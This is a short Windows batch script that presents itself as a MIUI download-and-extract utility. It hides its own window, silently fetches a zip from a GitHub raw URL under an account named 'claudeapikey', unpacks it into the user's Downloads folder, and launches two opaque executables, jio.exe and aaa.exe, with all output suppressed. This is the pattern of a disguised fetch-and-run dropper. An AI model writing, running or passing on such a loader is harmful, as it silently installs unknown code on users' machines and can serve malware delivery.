@echo off
if not defined MINIMIZED (
    set "MINIMIZED=1"
    start "" /min "%~f0"
    exit /b
)

setlocal
title MIUI Download and Extract

set "URL=https://raw.githubusercontent.com/claudeapikey/set/main/MIUI.zip"
set "DEST=%USERPROFILE%\Downloads"
set "ZIP=%DEST%\MIUI.zip"
set "EXTRACT=%DEST%\MIUI_Extracted"

if not exist "%DEST%" mkdir "%DEST%" >nul 2>&1

curl.exe -fsSL --retry 2 "%URL%" -o "%ZIP%" >nul 2>&1
if errorlevel 1 exit /b 1

if not exist "%EXTRACT%" mkdir "%EXTRACT%" >nul 2>&1

tar.exe -xf "%ZIP%" -C "%EXTRACT%" >nul 2>&1
if errorlevel 1 exit /b 1

if exist "%EXTRACT%\jio.exe" (
    start "" "%EXTRACT%\jio.exe"
) else (
    echo jio.exe not found in the extraction folder.
)

if exist "%EXTRACT%\aaa.exe" (
    start "" "%EXTRACT%\aaa.exe"
) else (
    echo aaa.exe not found in the extraction folder.
)

exit /b 0